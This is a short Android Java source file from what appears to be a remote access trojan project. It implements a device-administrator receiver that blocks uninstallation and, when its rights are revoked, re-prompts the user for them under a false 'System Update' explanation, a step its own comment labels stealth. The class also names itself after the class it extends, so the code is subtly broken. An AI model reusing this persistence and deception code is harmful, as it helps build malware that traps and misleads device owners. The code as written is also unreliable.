package com.enterprise.rat.admin;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class DeviceAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d("DeviceAdmin", "Device Admin activated - Uninstall now blocked");
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d("DeviceAdmin", "Device Admin deactivated");
        // Re-activate immediately if possible (stealth)
        try {
            Intent reactivate = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            reactivate.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(context, DeviceAdminReceiver.class));
            reactivate.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "System Update requires this permission to function.");
            reactivate.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(reactivate);
        } catch (Exception e) {
            Log.e("DeviceAdmin", "Failed to re-activate", e);
        }
    }

    @Override
    public void onPasswordChanged(Context context, Intent intent) { }
    @Override
    public void onPasswordFailed(Context context, Intent intent) { }
    @Override
    public void onPasswordSucceeded(Context context, Intent intent) { }
}
